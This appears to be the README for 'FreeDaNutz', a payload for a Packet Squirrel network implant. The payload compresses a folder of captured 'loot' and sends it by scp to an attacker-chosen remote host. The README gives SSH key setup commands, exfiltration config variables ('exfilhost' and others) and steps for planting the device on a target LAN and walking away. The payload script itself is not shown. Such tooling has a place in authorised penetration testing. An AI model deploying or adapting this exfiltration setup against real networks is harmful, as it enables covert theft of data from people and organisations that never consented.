|                 |                                                                                                    |
|:----------------|:---------------------------------------------------------------------------------------------------|
| **Title**	  | FreeDaNutz								       |
| **Description** | This payload will compress the loot folder and then send that file to a remote server via scp      |
| **Author**	  | [infoskirmish.com](http://www.infoskirmish.com)                                                   |
| **Version**	  | 1.0												      |
| **Category**	  | exfiltration											      |
| **Target** 	  | Any												      |
| **Net Mode**	  | NAT										      |

| Meaning   | Color             | Description                 |
|:----------|:-----------------:|:----------------------------|
| SUCCESS: | Rapid White       | Payload is shutting down    |
| FAIL:     | Red         | No USB storage found        |
|           | Red         | Cannot send files to remote host |
|           | Red         | Cannot ping remote host |
| ATTACK:   | Blink Yellow      | Payload is launching   |
|           | Rapid Cyan        | Compressing Loot Folder |
|           | Rapid Magenta     | Sending Compressed File |

### **Description**
This payload will compress the entire /mnt/loot folder. It will then send via scp that folder to a host you specify. This payload runs some checks to make sure things are set up correctly before it attempts to send any data over the network. If fatal errors occur then trouble shooting data is dumped into /mnt/loot/freedanutz/log.txt

### **Requirements**
+ USB access to get loot folder and to log messages.

### **SSH Setup**

1. SSH to the Squirrel
2. run: mkdir /root/.ssh
3. run: ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa
4. run: chmod 600 /root/.ssh/id_rsa
5. run: cat /root/.ssh/id__rsa.pub | ssh user@remotehost 'cat >> .ssh/authorized_keys'
6. make sure it works:
        ssh user@remotehost

Notes: The first time you may have to type "yes" to accept. Afterwards you shouldn't have to do this step.


### **Payload Setup**

1. Edit the config variables at the top.

     The main variables are:

          exfilhost="xx.xx.xx.xx"		# The hostname or ip address you want to send the data to.
          exfilhostuser="root"			# The username of the account for the above hostname
          sshport="22"				# Port to send data out on
          exfilfile="backup.tar.gz"		# The name of the compressed loot folder
          identityfile="/root/.ssh/id_rsa"	# Path to private identity file on the squirrel
          remotepath="/root/$exfilfile"	# Path to filename (include file name) on the remote machine.
          exfilfilepath="/mnt/$exfilfile"	# Location to temp store compressed loot (this gets sent)
          lootfolderpath="/mnt/loot"		# Path to loot folder
          payloadlogpath="/mnt/loot/freedanutz"# Path to store payload log file
          

2. Copy payload.sh into the ~/payloads/switch<n> folder you wish to deploy on.

3. Connect into a target machine with access to the LAN.

4. Set switch to the <n> spot and power up.

5. Leave, get coffee, take a nap while the payload runs.

6. When all is done the LED will just go blank. It is now safe to unplug and go about your day.

Enjoy!
